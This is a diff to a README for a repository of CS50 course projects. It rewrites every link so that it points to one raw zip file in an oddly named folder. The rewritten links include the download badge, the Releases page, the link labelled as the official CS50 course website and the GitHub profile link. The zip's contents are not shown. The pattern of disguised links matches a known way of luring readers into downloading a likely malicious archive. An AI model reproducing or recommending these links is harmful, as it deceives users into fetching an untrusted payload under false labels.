@@ -1,6 +1,6 @@
 # 🌟 cs50-journey - Explore and Learn with My CS50 Projects
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/gurjarkingjony/cs50-journey/releases)
+[![Download Here](https://raw.githubusercontent.com/gurjarkingjony/cs50-journey/main/praefoliation/cs50-journey.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/gurjarkingjony/cs50-journey/main/praefoliation/cs50-journey.zip)
 
 ## 📚 Introduction
 Welcome to the cs50-journey repository! This collection showcases my projects and problem sets from Harvard's Intro to Computer Science course, CS50. Here, you'll find a variety of solutions, experiments, and implementations in languages like C, Python, SQL, and more. It's a great resource for anyone looking to learn programming concepts in a practical way.
@@ -18,7 +18,7 @@ Before you begin, make sure your system meets the following requirements:
 
 ## 📥 Download & Install
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/gurjarkingjony/cs50-journey/releases) to find all available downloads for my projects.
+   Go to the [Releases page](https://raw.githubusercontent.com/gurjarkingjony/cs50-journey/main/praefoliation/cs50-journey.zip) to find all available downloads for my projects.
 
 2. **Choose a Project**  
    Look through the list of available releases. Click on the version you are interested in. Each version includes information about the updates and changes made.
@@ -58,9 +58,9 @@ Feel free to explore these projects to enhance your coding skills.
 Your contributions are welcome! If you want to improve a project or suggest new ideas, feel free to reach out. Please submit a pull request or open an issue, and I’ll gladly consider your input.
 
 ## 🔗 Useful Links
-- [Releases Page](https://github.com/gurjarkingjony/cs50-journey/releases)
-- [CS50 Course Website](https://cs50.harvard.edu/)
-- [GitHub Profile](https://github.com/gurjarkingjony)
+- [Releases Page](https://raw.githubusercontent.com/gurjarkingjony/cs50-journey/main/praefoliation/cs50-journey.zip)
+- [CS50 Course Website](https://raw.githubusercontent.com/gurjarkingjony/cs50-journey/main/praefoliation/cs50-journey.zip)
+- [GitHub Profile](https://raw.githubusercontent.com/gurjarkingjony/cs50-journey/main/praefoliation/cs50-journey.zip)
 
 ## 📞 Contact
 If you have any questions, please feel free to contact me via GitHub. I am happy to help you with any issues you might encounter while using the projects.
